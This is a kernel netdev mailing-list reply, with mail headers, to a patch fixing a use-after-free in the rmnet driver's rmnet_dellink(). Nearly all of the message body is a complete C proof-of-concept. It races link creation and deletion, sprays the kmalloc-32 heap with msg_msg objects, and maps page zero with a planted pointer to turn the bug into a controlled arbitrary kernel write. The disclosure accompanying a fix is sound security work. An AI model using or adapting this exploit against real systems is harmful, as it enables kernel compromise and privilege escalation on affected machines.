Return-Path: <netdev+bounces-286633-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id 0HG+DkPKAWoRjwEAu9opvQ
	(envelope-from <netdev+bounces-286633-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Mon, 11 May 2026 14:23:31 +0200
X-Original-To: lists+netdev@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
	by mail.lfdr.de (Postfix) with ESMTPS id B3E6C50D970
	for <lists+netdev@lfdr.de>; Mon, 11 May 2026 14:23:30 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id 4192B30E0FD3
	for <lists+netdev@lfdr.de>; Mon, 11 May 2026 12:15:20 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 1E48A36C0C3;
	Mon, 11 May 2026 12:15:20 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="eUPh/9iy"
X-Original-To: netdev@vger.kernel.org
Received: from mail-pf1-f182.google.com (mail-pf1-f182.google.com [209.85.210.182])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6C1E8377020
	for <netdev@vger.kernel.org>; Mon, 11 May 2026 12:15:18 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.182
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1778501720; cv=none; b=FeqkwQCGaPx6kItQXZzLfnTzxS74yBndUoqhj9dRBdCEyA0SnyGheLAGH+fP7HBz5bY289oMWtb9Pn21KU3UH6yPG9h+5JHu3zRzdrv20+i1d7E5JlmOKT08YTkDLNlTWQV/U0aDoAQ9CqqPLW68BR3/+t3+0AT0NKx9NoWVgJw=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1778501720; c=relaxed/simple;
	bh=5+rvnBJRXhablZFaQKtpJcp3j0mpm8JdiLBVQ7VG6Vc=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=JKPM0p1nJpXepwpQo7ci+mGb9M8bwKN1mXXELv6ZOHy2QTb1vrsnBZtwfPzL5mPbsLiYNJ2qcA1VC3N6yhEyyOKbtP7qH74dMuCZgwFFS9b5LDwQ1Nw0H0Df9jBRXjTMyX69Zzr4gMbjO10LUdPvY1/y15ozL5T5BolzQ493D80=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=eUPh/9iy; arc=none smtp.client-ip=209.85.210.182
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-pf1-f182.google.com with SMTP id d2e1a72fcca58-82f8893bff3so1864001b3a.2
        for <netdev@vger.kernel.org>; Mon, 11 May 2026 05:15:18 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1778501718; x=1779106518; darn=vger.kernel.org;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:from:to
         :cc:subject:date:message-id:reply-to;
        bh=d3g8LwNBS72SFnq5uFpy5PV6ZibvoViFc2H3LTOrRTM=;
        b=eUPh/9iyzzBI2vHmHE3Wa/hf9UffRTqle8b6bToroqP9T0DHvcHcT9bVaSDs1J7/Ia
         26C5l8UGkE7GOHgDfynLMtprx7mjX1yP8NX0dV5pzdWltMPR5AsVcqkaNmfaOyPMNSRM
         D4HA1iE4uYBpYn38S6z6hnfeuoEckba7Es1Oh4wEgCsU8LhLdnAs3NvxlC/K3PuoXGv+
         gNtm3zQtxP61zvWj9qcTEGPwJb5/u6bMxsbzNR+X+PwFiRUpBDOn1Fli07WedhmMODCX
         Qe2DqPh5AZUvTpIiPt3abhaYVicPWFdG7CP8kdrs+/jGXZsKEU2K43bzwW+QzMoWwC2Y
         kKkQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1778501718; x=1779106518;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=d3g8LwNBS72SFnq5uFpy5PV6ZibvoViFc2H3LTOrRTM=;
        b=KVKxKlDvYkA/Vgzs9i5iZBB9yWX3wfizpD85/m9FNuloyvF05aZlcoup5+2t+tamaR
         iUI/rYLL3lRM5RgUcNeBCD7ozmVJyp1qpZf0YjeWAlXE/FMVky7zzMKbIkGhmRonshop
         Qzt4gjIuXAPj6dyyt7xoNCD7Rs2UGQLMRcD03UaxF2wwO0bLZb7KsbOubuWq4zcpFQBA
         +LgXj7EM5zyajFReSE8v92zlXu9fyMjsNbP5v4a/zQt0YuAKMAkHYBolMhZ1lJBSbAIY
         3sDqlBeuFvHMns4ftYzXPVPVea43JngNiNERZzcAsmLnaxm3pmmPutDuOUJdYeeUTxWZ
         3yCA==
X-Gm-Message-State: AOJu0YzOWsetdPEKVFdGJa/DCu/+Za6s3TDIMX30fJ0lco/GhVvgSNny
	LLTpCFdEq5GRdEOTNXV6gIaCQFHZWB24SJY/bS93Q7kCzvdr8zD23CXY
X-Gm-Gg: Acq92OFK8fidSEvVAd999YWxSETuhmeFV3Ad/NEcfbsh0mdepNUynyClGpVV7bIkMJk
	ojzCdkXMociK4TDt+d1cW2e32kYsvq/XuWhcsCQGgBAFA/D4eImIhNmKkYiouhrAdZ0RAP2OfEX
	FyRb+lmTZo1jq3RNImDdgjtkzj2TpqTmrh1krjIZjItV6wpd/0VNw4UQkGdQW4Ub8xtVCU628jc
	DVTjJ5vffOvWmRiAsULH/N8G10TD155Ys10NtHwrUNTz3pXCbpYwgEu8O3kzPUi2iL0qRuDg1nZ
	Ap3Cena/ir0jFn9hqY4U65br6ixh53IdhOyCZNp7qfC9FbN+H/8az8vwKhcrYm91Kv2n1SPArt9
	97PY4lRzo+WMavhxL8/iIWCs1imLxkIFLK2R3S7Srdckrn+HD35optuvyXfvsnzIAi2Wz6rdwgt
	dNeWnWU8OzX33/17Sfope9jFXod9SM5gx4DvS6KjOcVJKgUJxL8sMV0xTOkOr2aA==
X-Received: by 2002:a05:6a00:194e:b0:82c:d7c4:4c56 with SMTP id d2e1a72fcca58-83e39d40202mr8729694b3a.15.1778501717366;
        Mon, 11 May 2026 05:15:17 -0700 (PDT)
Received: from Air.local ([198.176.50.157])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-839682abd39sm20740359b3a.52.2026.05.11.05.15.13
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 11 May 2026 05:15:16 -0700 (PDT)
Date: Mon, 11 May 2026 20:15:10 +0800
From: Weiming Shi <bestswngs@gmail.com>
To: Subash Abhinov Kasiviswanathan <subash.a.kasiviswanathan@oss.qualcomm.com>, 
	Sean Tranchetti <sean.tranchetti@oss.qualcomm.com>, Andrew Lunn <andrew+netdev@lunn.ch>, 
	"David S . Miller" <davem@davemloft.net>, Eric Dumazet <edumazet@google.com>, 
	Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>
Cc: netdev@vger.kernel.org, Xiang Mei <xmei5@asu.edu>
Subject: Re: [PATCH] net: qualcomm: rmnet: fix endpoint use-after-free in
 rmnet_dellink()
Message-ID: <agHIOLmkPnn-FxHr@Air.local>
References: <20260511120015.2298403-4-bestswngs@gmail.com>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <20260511120015.2298403-4-bestswngs@gmail.com>
X-Rspamd-Queue-Id: B3E6C50D970
X-Rspamd-Server: lfdr
X-Spamd-Result: default: False [-0.66 / 15.00];
	SUSPICIOUS_RECIPS(1.50)[];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
	R_SPF_ALLOW(-0.20)[+ip4:172.234.253.10:c];
	R_DKIM_ALLOW(-0.20)[gmail.com:s=20251104];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	TAGGED_FROM(0.00)[bounces-286633-lists,netdev=lfdr.de];
	FROM_HAS_DN(0.00)[];
	DKIM_TRACE(0.00)[gmail.com:+];
	TO_DN_SOME(0.00)[];
	RCVD_TLS_LAST(0.00)[];
	MIME_TRACE(0.00)[0:+];
	FORGED_SENDER_MAILLIST(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
	FREEMAIL_FROM(0.00)[gmail.com];
	RCVD_COUNT_FIVE(0.00)[5];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[bestswngs@gmail.com,netdev@vger.kernel.org];
	MISSING_XM_UA(0.00)[];
	NEURAL_HAM(-0.00)[-1.000];
	TAGGED_RCPT(0.00)[netdev];
	RCPT_COUNT_SEVEN(0.00)[9];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns]
X-Rspamd-Action: no action


Thanks for your attention to this bug. Here are some resources to help
you trigger the bug.

Required key configs for the poc:

CONFIG_USER_NS=y
kernel.unprivileged_userns_clone=1


Here is a PoC trigger that causes the intended crash shown in the
commit message:
```
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if_ether.h>
#include <linux/if_tun.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <net/if.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef ETH_P_MAP
#define ETH_P_MAP 0x00F9
#endif

#ifndef RMNET_FLAGS_INGRESS_DEAGGREGATION
#define RMNET_FLAGS_INGRESS_DEAGGREGATION (1U << 0)
#endif

enum {
        _IFLA_RMNET_UNSPEC,
        _IFLA_RMNET_MUX_ID,
        _IFLA_RMNET_FLAGS,
        ___IFLA_RMNET_MAX,
};
struct _ifla_rmnet_flags { uint32_t flags; uint32_t mask; };

#ifndef IFLA_INFO_KIND
#define IFLA_INFO_KIND 1
#define IFLA_INFO_DATA 2
#endif

#define NL_BUFSZ    4096
#define TUN_NAME    "tunrm0"
#define KEEP_NAME   "rmkeep0"
#define VICTIM_NAME "rmvict0"
#define KEEP_MUX    2
#define VICTIM_MUX  1
#define NUM_WRITERS 4

/*
 * Offset of priv->pcpu_stats when dev=NULL:
 *   netdev_priv(NULL) = ALIGN(sizeof(struct net_device), 32)
 *   On this kernel build: 0xa00
 *   pcpu_stats is at offsetof(rmnet_priv, pcpu_stats) = 0x10
 *   So priv->pcpu_stats is at address 0xa10
 *
 * Determined from crash output:
 *   CR2: 0000000000000a10
 *   Code: <48> 8b 86 10 0a 00 00  →  mov rax, [rsi + 0xa10]
 */
#define NETDEV_PRIV_OFFSET   0xa00
#define PCPU_STATS_OFFSET    0x10
#define NULL_PAGE_TARGET     (NETDEV_PRIV_OFFSET + PCPU_STATS_OFFSET) /* 0xa10 */

/*
 * To write at an arbitrary kernel address T:
 *   *(0xa10) = T - per_cpu_offset
 *   per_cpu_offset is read from GS base at runtime.
 *
 * Default target: 0xffffffffdeadbeef (unmapped → page fault proves control)
 * Change WRITE_TARGET to any mapped kernel address for a silent write.
 */
#define WRITE_TARGET         0xffffffffdeadbeefULL
#define PERCPU_OFFSET        0xffff8880f81df000ULL  /* CPU1 on this QEMU build */
#define PCPU_MARKER          ((WRITE_TARGET - PERCPU_OFFSET) & 0xffffffffffffffffULL)

/* Heap spray: msg_msgseg marker for the egress_dev pointer */
#define SPRAY_MARKER         0x4141414141414141ULL

/* --- Heap spray parameters --- */
#define MSG_MSG_SZ_MAX  48
#define DATALEN_MSG     (4096 - MSG_MSG_SZ_MAX)
#define SEG_DATA_SZ     24
#define MSG_TOTAL_SZ    (DATALEN_MSG + SEG_DATA_SZ)
#define SPRAY_COUNT     128

struct spray_msg {
        long mtype;
        char mtext[MSG_TOTAL_SZ];
};

struct rmnet_map_hdr {
        uint8_t  flags;
        uint8_t  mux_id;
        uint16_t pkt_len;
} __attribute__((packed));

static volatile int g_stop = 0;
static int spray_qid = -1;
static struct spray_msg *spray_buf;
static struct spray_msg *recv_buf;

static void pin_cpu(int cpu)
{
        cpu_set_t s;
        CPU_ZERO(&s);
        CPU_SET(cpu, &s);
        sched_setaffinity(0, sizeof(s), &s);
}

static uint16_t ip_csum(const void *b, size_t l)
{
        const uint16_t *p = b;
        uint32_t s = 0;
        while (l > 1) { s += *p++; l -= 2; }
        if (l) s += *(const uint8_t *)p;
        while (s >> 16) s = (s & 0xffff) + (s >> 16);
        return ~s;
}

/* --- NULL page mapping --- */

static void setup_null_page(void)
{
        FILE *f;

        f = fopen("/proc/sys/vm/mmap_min_addr", "w");
        if (f) {
                fprintf(f, "0\n");
                fclose(f);
        } else {
                fprintf(stderr, "WARNING: cannot set mmap_min_addr=0\n");
        }

        /*
         * Map page 0 so that when skb->dev=NULL, the kernel can read
         * through netdev_priv(NULL) without faulting (requires nosmap).
         *
         * At offset 0xa10, place a controlled pcpu_stats pointer.
         * The kernel does: this_cpu_ptr(*(0xa10)) → write at controlled addr.
         */
        void *p = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                       MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
                       -1, 0);
        if (p == MAP_FAILED) {
                perror("mmap NULL page");
                fprintf(stderr, "NULL page mapping failed — will rely on heap spray only\n");
                return;
        }

        memset(p, 0, 0x1000);

        /* Place controlled pcpu_stats pointer at offset 0xa10 */
        *(uint64_t *)((char *)p + NULL_PAGE_TARGET) = PCPU_MARKER;

        fprintf(stderr, "NULL page mapped. *(0x%x) = 0x%llx\n",
                NULL_PAGE_TARGET, (unsigned long long)PCPU_MARKER);
        fprintf(stderr, "Write target: 0x%llx (= 0x%llx + per_cpu 0x%llx)\n",
                (unsigned long long)WRITE_TARGET,
                (unsigned long long)PCPU_MARKER,
                (unsigned long long)PERCPU_OFFSET);
}

/* --- Heap spray --- */

static void spray_init(void)
{
        spray_buf = malloc(sizeof(*spray_buf));
        recv_buf = malloc(sizeof(*recv_buf));
        if (!spray_buf || !recv_buf) { perror("malloc spray"); exit(1); }

        spray_buf->mtype = 1;
        memset(spray_buf->mtext, 0x41, MSG_TOTAL_SZ);

        spray_qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (spray_qid < 0) { perror("msgget"); exit(1); }

        struct msqid_ds ds;
        msgctl(spray_qid, IPC_STAT, &ds);
        ds.msg_qbytes = SPRAY_COUNT * (MSG_TOTAL_SZ + 64);
        msgctl(spray_qid, IPC_SET, &ds);
}

static int spray_kmalloc32(void)
{
        int sent = 0;
        for (int i = 0; i < SPRAY_COUNT; i++) {
                if (msgsnd(spray_qid, spray_buf, MSG_TOTAL_SZ, IPC_NOWAIT) < 0)
                        break;
                sent++;
        }
        return sent;
}

static void spray_cleanup(int count)
{
        for (int i = 0; i < count; i++) {
                if (msgrcv(spray_qid, recv_buf, MSG_TOTAL_SZ, 0, IPC_NOWAIT) < 0)
                        break;
        }
}

/* --- Netlink helpers --- */

#define NLMSG_TAIL(n) \
        ((struct rtattr *)(((char *)(n)) + NLMSG_ALIGN((n)->nlmsg_len)))

static void nla_put(struct nlmsghdr *n, int t, const void *d, size_t l)
{
        struct rtattr *r = NLMSG_TAIL(n);
        size_t rl = RTA_LENGTH(l);
        r->rta_type = t;
        r->rta_len = rl;
        if (l) memcpy(RTA_DATA(r), d, l);
        n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(rl);
}

static struct rtattr *nla_nest(struct nlmsghdr *n, int t)
{
        struct rtattr *r = NLMSG_TAIL(n);
        nla_put(n, t, NULL, 0);
        return r;
}

static void nla_nest_end(struct nlmsghdr *n, struct rtattr *r)
{
        r->rta_len = (char *)NLMSG_TAIL(n) - (char *)r;
}

static int nl_talk(int fd, struct nlmsghdr *h)
{
        static uint32_t seq = 100;
        char buf[NL_BUFSZ];

        h->nlmsg_seq = __atomic_fetch_add(&seq, 1, __ATOMIC_RELAXED);
        h->nlmsg_pid = 0;
        if (send(fd, h, h->nlmsg_len, 0) < 0) return -errno;

        for (;;) {
                ssize_t n = recv(fd, buf, sizeof(buf), 0);
                if (n < 0) { if (errno == EINTR) continue; return -errno; }
                struct nlmsghdr *r;
                for (r = (void *)buf; NLMSG_OK(r, (unsigned)n); r = NLMSG_NEXT(r, n)) {
                        if (r->nlmsg_seq != h->nlmsg_seq) continue;
                        if (r->nlmsg_type == NLMSG_ERROR)
                                return ((struct nlmsgerr *)NLMSG_DATA(r))->error;
                        if (r->nlmsg_type == NLMSG_DONE) return 0;
                }
        }
}

/* --- Device operations --- */

static int open_tun(const char *name)
{
        int fd = open("/dev/net/tun", O_RDWR | O_NONBLOCK);
        if (fd < 0) { perror("tun"); exit(1); }
        struct ifreq ifr = {};
        snprintf(ifr.ifr_name, IFNAMSIZ, "%s", name);
        ifr.ifr_flags = IFF_TUN | IFF_MULTI_QUEUE;
        if (ioctl(fd, TUNSETIFF, &ifr)) { perror("TUNSETIFF"); exit(1); }
        return fd;
}

static void link_up(const char *name)
{
        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        struct ifreq ifr = {};
        snprintf(ifr.ifr_name, IFNAMSIZ, "%s", name);
        ioctl(fd, SIOCGIFFLAGS, &ifr);
        ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
        ioctl(fd, SIOCSIFFLAGS, &ifr);
        close(fd);
}

static int mk_rmnet(int nlfd, const char *name, const char *lower, uint16_t mux)
{
        struct { struct nlmsghdr h; struct ifinfomsg i; char b[NL_BUFSZ]; } rq = {};
        unsigned idx = if_nametoindex(lower);
        if (!idx) return -ENODEV;

        rq.h.nlmsg_len = NLMSG_LENGTH(sizeof(rq.i));
        rq.h.nlmsg_type = RTM_NEWLINK;
        rq.h.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;

        nla_put(&rq.h, IFLA_IFNAME, name, strlen(name) + 1);
        nla_put(&rq.h, IFLA_LINK, &idx, 4);

        struct rtattr *li = nla_nest(&rq.h, IFLA_LINKINFO);
        nla_put(&rq.h, IFLA_INFO_KIND, "rmnet", 6);
        struct rtattr *id = nla_nest(&rq.h, IFLA_INFO_DATA);
        nla_put(&rq.h, _IFLA_RMNET_MUX_ID, &mux, 2);
        struct _ifla_rmnet_flags f = { 0, RMNET_FLAGS_INGRESS_DEAGGREGATION };
        nla_put(&rq.h, _IFLA_RMNET_FLAGS, &f, sizeof(f));
        nla_nest_end(&rq.h, id);
        nla_nest_end(&rq.h, li);

        return nl_talk(nlfd, &rq.h);
}

static int rm_link(int nlfd, const char *name)
{
        unsigned idx = if_nametoindex(name);
        if (!idx) return -ENODEV;
        struct { struct nlmsghdr h; struct ifinfomsg i; char b[256]; } rq = {};
        rq.h.nlmsg_len = NLMSG_LENGTH(sizeof(rq.i));
        rq.h.nlmsg_type = RTM_DELLINK;
        rq.h.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
        rq.i.ifi_index = idx;
        return nl_talk(nlfd, &rq.h);
}

/* --- Writer thread --- */

static void *writer_fn(void *arg)
{
        int fd = *(int *)arg;
        uint8_t pkt[64];
        struct tun_pi *pi = (void *)pkt;
        struct rmnet_map_hdr *rm = (void *)(pi + 1);
        uint8_t *ip = (uint8_t *)(rm + 1);

        memset(pkt, 0, sizeof(pkt));
        pi->proto = htons(ETH_P_MAP);
        rm->mux_id = VICTIM_MUX;
        rm->pkt_len = htons(20);
        ip[0] = 0x45; ip[3] = 0x14; ip[4] = 0x12; ip[5] = 0x34;
        ip[8] = 0x40; ip[9] = 0xfd;
        ip[12] = 0x0a; ip[15] = 1; ip[16] = 0x0a; ip[19] = 2;
        *(uint16_t *)(ip + 10) = ip_csum(ip, 20);
        size_t len = sizeof(*pi) + sizeof(*rm) + 20;

        pin_cpu(1);

        while (!__atomic_load_n(&g_stop, __ATOMIC_RELAXED)) {
                for (int i = 0; i < 64; i++)
                        write(fd, pkt, len);
        }
        return NULL;
}

int main(void)
{
        int nlfd, tun_fds[NUM_WRITERS];
        pthread_t tids[NUM_WRITERS];
        uint64_t iter = 0;
        int spray_sent;

        fprintf(stderr,
                "=== rmnet endpoint RCU UAF → controlled write PoC ===\n\n"
                "Write chain: ep->egress_dev → skb->dev → netdev_priv()\n"
                "  → priv->pcpu_stats → this_cpu_ptr() → rx_pkts++ (WRITE)\n\n"
                "Two attack paths:\n"
                "  Path A (NULL page): ep->egress_dev=NULL → dev=NULL\n"
                "    → reads *(0x%x) from mapped page 0 → controlled write\n"
                "  Path B (heap spray): ep->egress_dev=0x%llx from msg_msgseg\n"
                "    → direct controlled pointer → GP fault at marker\n\n",
                NULL_PAGE_TARGET,
                (unsigned long long)SPRAY_MARKER);

        pin_cpu(0);
        nlfd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);

        /* Map page 0 with controlled data for the NULL deref path */
        setup_null_page();

        /* Create TUN + persistent rmnet */
        for (int i = 0; i < NUM_WRITERS; i++)
                tun_fds[i] = open_tun(TUN_NAME);
        link_up(TUN_NAME);

        if (mk_rmnet(nlfd, KEEP_NAME, TUN_NAME, KEEP_MUX))
                { fprintf(stderr, "Failed to create %s\n", KEEP_NAME); exit(1); }
        link_up(KEEP_NAME);

        /* Initialize heap spray */
        spray_init();

        /* Start writer threads */
        for (int i = 0; i < NUM_WRITERS; i++)
                pthread_create(&tids[i], NULL, writer_fn, &tun_fds[i]);

        fprintf(stderr, "Writers started. Racing...\n");

        for (;;) {
                iter++;

                int e = mk_rmnet(nlfd, VICTIM_NAME, TUN_NAME, VICTIM_MUX);
                if (e) {
                        if ((iter % 10000) == 0)
                                fprintf(stderr, "[%llu] create err=%d\n",
                                        (unsigned long long)iter, e);
                        usleep(100);
                        continue;
                }
                link_up(VICTIM_NAME);

                rm_link(nlfd, VICTIM_NAME);

                /* Spray kmalloc-32 to reclaim freed endpoint slab */
                spray_sent = spray_kmalloc32();

                usleep(50);

                spray_cleanup(spray_sent);

                while (if_nametoindex(VICTIM_NAME))
                        ;

                if ((iter % 500) == 0)
                        fprintf(stderr, "[spray] iter=%llu sent=%d\n",
                                (unsigned long long)iter, spray_sent);
        }

        __atomic_store_n(&g_stop, 1, __ATOMIC_RELAXED);
        for (int i = 0; i < NUM_WRITERS; i++)
                pthread_join(tids[i], NULL);
        msgctl(spray_qid, IPC_RMID, NULL);
        close(nlfd);
        return 0;
}

```


